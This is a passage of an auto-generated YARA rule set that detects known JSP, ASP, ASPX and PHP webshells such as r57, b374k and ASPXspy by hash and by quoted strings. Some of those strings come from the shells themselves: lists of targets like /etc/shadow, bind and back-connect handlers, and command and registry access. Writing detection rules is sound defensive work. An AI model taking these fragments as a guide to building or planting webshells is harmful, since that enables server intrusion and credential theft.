      $s8 = "ResultSet rs = (ResultSet)obj;" fullword ascii
      $s9 = "while(rs.next()) {" fullword ascii
      $s10 = "}catch(Exception ex) {" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _in_Browser_download_warn_ma_leo_jfolder01_jsp_File_browser_3_JFolder_shell1_jsp_346 {
   meta:
      description = "webshell - from files in.jsp, Browser.jsp, download.jsp, warn.jsp, ma.jsp, leo.jsp, jfolder01.jsp, jsp_File_browser.jsp, 3.jsp, JFolder.jsp, shell1.jsp, jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash2 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash3 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
      hash4 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash5 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
      hash6 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash7 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash8 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
      hash9 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
      hash10 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash11 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash12 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
   strings:
      $s1 = "if (time - 60l >= 0){" fullword ascii
      $s2 = "request.setAttribute(\"error\", \"Cannot upload file.\");" fullword ascii
      $s3 = "else return \"\" + (char) i;" fullword ascii
      $s4 = "else return time<10 ? \"0\" + time + \"s\": time + \"s\";" fullword ascii
      $s5 = "if (time % 60 >=10) return time / 60 + \":\" + (time % 60) + \"m\";" fullword ascii
      $s6 = "else return time / 60 + \":0\" + (time % 60) + \"m\";" fullword ascii
      $s7 = "else return (int) (currSize * 100 / totalSize);" fullword ascii
      $s8 = "else return \"n/a\";" fullword ascii
      $s9 = "if (totalSize == 0) return 0;" fullword ascii
      $s10 = "if (currSize == 0) return \"n/a\";" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _mysql_oracle_347 {
   meta:
      description = "webshell - from files mysql.jsp, oracle.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "709925f24268dcfe93d666d210b38ddee557bfd08b13744426b4fc44ce955008"
      hash2 = "1970d3f76e891d8b4948967d77736ab21ff299dcd90d458373d3fa1d69c3ac98"
   strings:
      $s1 = "    Connection conn = DriverManager.getConnection(url, username, password);" fullword ascii
      $s2 = "    String password = \"pass\";" fullword ascii
      $s3 = "out.println(\"<p><h3>finished</h3></p>\");" fullword ascii
      $s4 = "    String ex=\".txt\";" fullword ascii
      $s5 = "    String username = \"user\";" fullword ascii
      $s6 = "    // Get tables" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 8KB and ( all of them )
      ) or ( all of them )
}

rule _t00ls1_t00ls_hideShell_348 {
   meta:
      description = "webshell - from files t00ls1.jsp, t00ls.jsp, hideShell.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash2 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash3 = "95e97a480447aa0ab0e679af117178e56490d9fb7b4b9ec0ed26efbeede56eb3"
   strings:
      $s1 = "  while ((a = sis.readLine(b,0,b.length))!= -1) {" fullword ascii
      $s2 = "  sis = request.getInputStream();" fullword ascii
      $s3 = " if ((k = s.indexOf(\"filename=\\\"\"))!= -1) {" fullword ascii
      $s4 = " while ((a = sis.readLine(b,0,b.length))!=-1) {" fullword ascii
      $s5 = "  String s = \"\";" fullword ascii
      $s6 = " String s = \"\";" fullword ascii
      $s7 = "  int a = 0;" fullword ascii
      $s8 = " int k = 0;" fullword ascii
      $s9 = " int a = 0;" fullword ascii
      $s10 = "  int k = 0;" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _asp___1__2013110125027897_asp__1___2014_10_23_14_54_16__2014_NEW_WebShell__1___349 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, _2014.asp, NEW WebShell (1).asp, asp (1).asp, asp (1).asp, .asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, _2012.asp, .asp, vps.asp, NEW WebShell.asp,  (1).asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash4 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash5 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash6 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash7 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash8 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash9 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash10 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash11 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash12 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash13 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash14 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash15 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash16 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash17 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash18 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "Function Encrypt(acd)" fullword ascii
      $s2 = "Encrypt=bbc" fullword ascii
      $s3 = "e=replace(d,\"" fullword ascii
      $s4 = "sWHEEL1 = \"jwt\"" fullword ascii
      $s5 = "bbc=bbc&mid(sWHEEL1,cint(e),1)" fullword ascii
      $s6 = "if c=\"" fullword ascii
      $s7 = "c=mid(acd,i,1)" fullword ascii
      $s8 = "d=mid(acd,i,2)" fullword ascii
      $s9 = "bbc=bbc&c" fullword ascii
      $s10 = "For i = 1 To Len(acd) step 1" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _asp___1__asp__1___2014_10_23_14_54_16_asp__1__asp__1___as_350 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, asp (1)__2014-10-23-14-54-16.asp, asp (1).asp, asp (1).asp, .asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp, .asp, vps.asp,  (1).asp,  (1)__2014-10-23-14-54-16.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash4 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash5 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash6 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash7 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash8 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash9 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash10 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash11 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash12 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
      hash13 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "Set objGroup=GetObject(\"WinNT://\"&tN.ComputerName&\"/Administrators,group\")" fullword ascii
      $s2 = "Set wsX = Server.CreateObject(\"WScript.Shell\")" fullword ascii
      $s3 = "Set tN=server.createObject(\"Wscript.Network\")" fullword ascii
      $s4 = ":Wscript.Network\"" fullword ascii
      $s5 = "Response.Expires=0" fullword ascii
      $s6 = "theArray=wsX.RegRead(thePath)" fullword ascii
      $s7 = "For i=0 To UBound(theArray)" fullword ascii
      $s8 = "For Each admin in objGroup.Members" fullword ascii
      $s9 = "If IsArray(theArray) Then" fullword ascii
      $s10 = "thePath=Request(\"thePath\")" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule ___1__NEW_WebShell__1__asp__1__UnKnown_Vip__1___asp_UnKnown_Vip_asp__1_351 {
   meta:
      description = "webshell - from files  (1).asp, NEW WebShell (1).asp, asp (1).asp, UnKnown Vip (1).asp, .asp, asp.asp, UnKnown Vip.asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, NEW WebShell.asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash2 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash3 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash4 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash5 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash6 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash7 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash8 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash9 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash10 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash11 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash12 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>" fullword ascii
      $s2 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s3 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>" fullword ascii
      $s4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Symantec\\\\pcAnywhere\\\\\"" ascii
      $s5 = "<a href='javascript:ShowFolder(\"\"c:\\\\windows\\\\Temp\\\\\"\")'>Temp</a>" fullword ascii
      $s6 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>" fullword ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\Real\"\")'>RealServer</a>" fullword ascii
      $s8 = "<a href='javascript:ShowFolder(\"\"C:\\\\Program Files\"\")'>Program</a>" fullword ascii
      $s9 = "<a href='javascript:ShowFolder(\"\"c:\\\\Program Files\\\\serv-u\\\\\"\")'>serv-u</a>" fullword ascii
      $s10 = "<a href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\Microsoft SQL Server\\\\\"\")'>SQL</a>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__NEW_WebShell__1___2014_10_23_14_54_16_NEW_WebShell_r00tsFSO_352 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, NEW WebShell.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash3 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash4 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "Function Cmd1Shell()" fullword ascii
      $s2 = "Function CompactMdb(Path)" fullword ascii
      $s3 = "oo'?><?php phpinfo()?>\":fso.CreateTextFile(server.mappath(\"test.jsp\")).Write\"Jsp Test oo" fullword ascii
      $s4 = "Function HTMLEncode(S)" fullword ascii
      $s5 = " </center>\"" fullword ascii
      $s6 = "sub SetFileText()" fullword ascii
      $s7 = "Function DownFile(Path)" fullword ascii
      $s8 = "Function CreateMdb(Path) " fullword ascii
      $s9 = ")<br/>\"" fullword ascii
      $s10 = "&nbsp;&nbsp;&nbsp;&nbsp;" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _1d_mumaasp_com_EFSO_2_353 {
   meta:
      description = "webshell - from files 1d.asp, mumaasp.com.asp, EFSO_2.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5a1a2900ec634bb1651fff9d542491221449754289ad5a58791ee3104ccef752"
      hash2 = "a127dfa17e403f954441ae42d4bca8d2bdbc2e566e522a2ea75d88722540efae"
      hash3 = "c3b029e9e7077164976a5f73399b07dd481ac41d524328f933a4cd62a36af679"
   strings:
      $s1 = "/aGxk+ " fullword ascii
      $s2 = "daWUk+c" fullword ascii
      $s3 = "/wKxknRqDrY" fullword ascii
      $s4 = "dwKxdnchDrO" fullword ascii
      $s5 = "daWUk+chDbY" fullword ascii
      $s6 = "/aWU/n qDrY" fullword ascii
      $s7 = "w;Y,xCh" fullword ascii
      $s8 = "/aWxk+c" fullword ascii
      $s9 = "/aWU/n SDrY" fullword ascii
      $s10 = "/wKUd+c" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _mumaasp_com_EFSO_2_354 {
   meta:
      description = "webshell - from files mumaasp.com.asp, EFSO_2.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a127dfa17e403f954441ae42d4bca8d2bdbc2e566e522a2ea75d88722540efae"
      hash2 = "c3b029e9e7077164976a5f73399b07dd481ac41d524328f933a4cd62a36af679"
   strings:
      $s1 = "dwKxdnc" fullword ascii
      $s2 = "VVal9[k" fullword ascii
      $s3 = "w!Y~xCh" fullword ascii
      $s4 = "'Jr4rN9+" fullword ascii
      $s5 = "P',HWDtk" fullword ascii
      $s6 = "P+M.WMPD" fullword ascii
      $s7 = "D ZM+CO" fullword ascii
      $s8 = "'BSr[Y4)8!T]I4" fullword ascii
      $s9 = "N~k6@#@&n" fullword ascii
      $s10 = "o@#@&+" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _nstview_Ani_Shell_newsh_qyt0dHv1_v4xGus6X_Dx_aioshell_NIX_REMOTE_WEB_SHELL_355 {
   meta:
      description = "webshell - from files nstview.php, Ani-Shell.php, newsh.php, qyt0dHv1.php, v4xGus6X.php, Dx.php, aioshell.php, NIX REMOTE WEB-SHELL.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a111977d2403dd241ef2fabe841b96535f05d004a276e12ad29462b565b8aaa8"
      hash2 = "9476a89065f61d65f093098e59444d605012872ade480bd02235cc545618231c"
      hash3 = "60a4730f359762d973d9cfc00093cdbddaa2ce4ca4c4e113a57c73e44353d93c"
      hash4 = "9507cfcb16c1a7f91c2ec0b93393615e85fb7834c10c58c2f351f0c69bdee285"
      hash5 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash6 = "36f50344183b4bc8b44e64143915ba2c02b9fbf239ce07b8925f849268ee5b3b"
      hash7 = "9211e746ea45d8531d92fa01889b750187deeb41d5400dbd572b6474a1342803"
      hash8 = "6ee85fade63001a1129d3fd66223066647377a49cfeec4e92b075988fe937b2f"
   strings:
      $s1 = "$info .= (($perms & 0x0010) ? 'w' : '-');" fullword ascii /* Goodware String - occured 1 times */
      $s2 = "$info .= (($perms & 0x0002) ? 'w' : '-');" fullword ascii /* Goodware String - occured 1 times */
      $s3 = "$info .= (($perms & 0x0080) ? 'w' : '-');" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "$info .= (($perms & 0x0008) ?" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "$info .= (($perms & 0x0001) ?" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "$info .= (($perms & 0x0040) ?" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "$info .= (($perms & 0x0020) ? 'r' : '-');" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword ascii /* Goodware String - occured 1 times */
      $s9 = "$info .= (($perms & 0x0100) ? 'r' : '-');" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_3_2_2_b374k_3_2_3_356 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-3.2.2.php, b374k-3.2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash3 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
   strings:
      $s1 = "\"/etc/os-release\", \"/etc/passwd\", \"/etc/shadow\", \"/etc/group\", \"/etc/issue\", \"/etc/issue.net\", \"/etc/motd\", \"/etc" ascii
      $s2 = "\"/etc/os-release\", \"/etc/passwd\", \"/etc/shadow\", \"/etc/group\", \"/etc/issue\", \"/etc/issue.net\", \"/etc/motd\", \"/etc" ascii
      $s3 = "c/hosts\", \"/etc/aliases\"," fullword ascii
      $s4 = "if(function_exists('sqlsrv_field_metadata')){" fullword ascii
      $s5 = "if(is_array($arr)){" fullword ascii
      $s6 = "if(function_exists('sqlsrv_connect')){" fullword ascii
      $s7 = "else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace(\"\\'\\'\", \"" ascii
      $s8 = "if(is_array($v)) $arr[$k] = clean($v);" fullword ascii
      $s9 = "else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace(\"\\'\\'\", \"" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_kartal_r57_r57_iFX_NIX_REMOTE_WEB_SHELL_357 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57_kartal.php, r57.php, r57_iFX.php, NIX REMOTE WEB-SHELL.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash5 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash7 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash8 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash9 = "6ee85fade63001a1129d3fd66223066647377a49cfeec4e92b075988fe937b2f"
   strings:
      $s1 = "if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']==\"C\"))" fullword ascii
      $s2 = "if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']==\"Perl\"))" fullword ascii
      $s3 = " $_POST['cmd']=\"ps -aux | grep bd\";" fullword ascii
      $s4 = " $_POST['cmd']=\"ps -aux | grep bdpl\";" fullword ascii
      $s5 = "if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']==\"Perl\"))" fullword ascii
      $s6 = "if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']==\"C\"))" fullword ascii
      $s7 = "foreach ($aliases as $alias_name=>$alias_cmd)" fullword ascii
      $s8 = "echo \"</textarea></div>\";" fullword ascii
      $s9 = " break;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_2_5_source_358 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-2.5.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
   strings:
      $s1 = "='login' style='width:120px;' value='' />" fullword ascii
      $s2 = "<?php echo $s_name; ?>&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name" ascii
      $s3 = "<?php echo $s_name; ?>&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name" ascii
      $s4 = "e !' style='width:120px;height:30px;' onclick=\\\"return submithex();\\\" /></p>" fullword ascii
      $s5 = "global $s_python, $s_perl, $s_ruby, $s_gcc, $s_java, $s_tar;" fullword ascii
      $s6 = "<p class='footer'>Jayalah Indonesiaku &copy;<?php echo @date(\"Y\",time()).\" \".$s_name; ?></p>" fullword ascii
      $s7 = "$s_result .= \"<tr><th class='sorttable_nosort'>action</th>\";" fullword ascii
      $s8 = "<p style='padding:0 0 14px 0;border-bottom:1px solid #393939;'><input type='submit' name='fcsubmit' class='inputzbut' value='Sav" ascii
      $s9 = "<p style='padding:0 0 14px 0;border-bottom:1px solid #393939;'><input type='submit' name='fcsubmit' class='inputzbut' value='Sav" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _icesword_silic_ghost_source_system_359 {
   meta:
      description = "webshell - from files icesword.php, silic.php, ghost_source.php, system.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
      hash2 = "8f00d641fc0655d989b3c6abaf414266f1a2c877be5ada07b4265aa069729aca"
      hash3 = "a423ef2bec4f1c75d49c6eeb2b6aa38128dae2afcf6e0e7ebfe196833ea43a78"
      hash4 = "c142d327f84c86160f6775009ff016baf45d1a77de4747dd8ca35bd9b36954be"
   strings:
      $s1 = "<option value=\"6\">" fullword ascii
      $s2 = "<option value=\"3\">" fullword ascii
      $s3 = "<option value=\"7\">" fullword ascii
      $s4 = "<option value=\"1\">" fullword ascii
      $s5 = "<option value=\"4\">" fullword ascii
      $s6 = "<option value=\"9\">" fullword ascii
      $s7 = "<option value=\"2\">" fullword ascii
      $s8 = "<option value=\"8\">" fullword ascii
      $s9 = "<option value=\"5\">" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6540 or uint16(0) == 0x253c ) and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _ASPXspy2_icesword_111_aspx_con2_360 {
   meta:
      description = "webshell - from files ASPXspy2.aspx, icesword.aspx, 111.aspx, aspx.aspx, con2.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
      hash2 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
      hash3 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
      hash4 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
      hash5 = "d175b3176f1fb891735a2aaed2bc851074b3b50d4eb99c90146dc6a0eaa26d48"
   strings:
      $s1 = "private bool SGde(string sSrc)" fullword ascii
      $s2 = "<asp:Table ID=\"GlI\" runat=\"server\" Width=\"100%\" CellSpacing=\"0\">" fullword ascii
      $s3 = "public string MVVJ(string instr)" fullword ascii
      $s4 = "public void AdCx()" fullword ascii
      $s5 = "tnQRF.InnerHtml=\"<hr width=\\\"100%\\\" noshade/><pre>\"+Uoc+\"</pre>\";" fullword ascii
      $s6 = "tnQRF.Visible=true;" fullword ascii
      $s7 = "Uoc=Uoc.Replace(\"\\r\\n\",\"<br>\");" fullword ascii
      $s8 = "Uoc=Uoc.Replace(\">\",\"&gt;\");" fullword ascii
      $s9 = "Uoc=Uoc.Replace(\"<\",\"&lt;\");" fullword ascii
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _01_11_ASP_NET_Web_BackDoor_aspxspy_aspx_361 {
   meta:
      description = "webshell - from files 01.aspx, 11.aspx, ASP.NET Web BackDoor.aspx, aspxspy.aspx, aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ac6ae000d13f06fd4a0f87af57a2dcc4559fc5d5aa4cc7a1606139ffa85cf473"
      hash2 = "f09b8567e0aa79ab9b223019b3f67cf98fe7dd2ffcab881e1421adf6f9e4c5b0"
      hash3 = "579e0f946f0d165567b7a8e933b6000368480ce09d51042e8753e4b389318dbc"
      hash4 = "fca2eae39f4009790408335b71d773b02890a08b581c6ff6bb32def585020abf"
      hash5 = "51d564b700c985fd7aba31ed6a0b8f7b7ddaa7a2adcdaf8d649adb2641ade061"
   strings:
      $s1 = "taEnable=0\\r\\n-MaxUsersLoginPerIP=-1\\r\\n-SpeedLimitUp=0\\r\\n-SpeedLimitDown=0\\r\\n-MaxNrUsers=-1\\r\\n-IdleTimeOut=600\\r" ascii
      $s2 = "LoginMesFile=\\r\\n-Disable=0\\r\\n-RelPaths=1\\r\\n-NeedSecure=0\\r\\n-HideHidden=0\\r\\n-AlwaysAllowLogin=0\\r\\n-ChangePasswo" ascii
      $s3 = "rdType=Regular\\r\\n-Ratios=NoneRN\\r\\n Access=c:\\\\|RWAMELCDP\\r\\n\";" fullword ascii
      $s4 = "meOut=-1\\r\\n-Expire=0\\r\\n-RatioDown=1\\r\\n-RatiosCredit=0\\r\\n-QuotaCurrent=0\\r\\n-QuotaMaximum=0\\r\\n-Maintenance=Syste" ascii
      $s5 = "            Response.End();" fullword ascii
   condition:
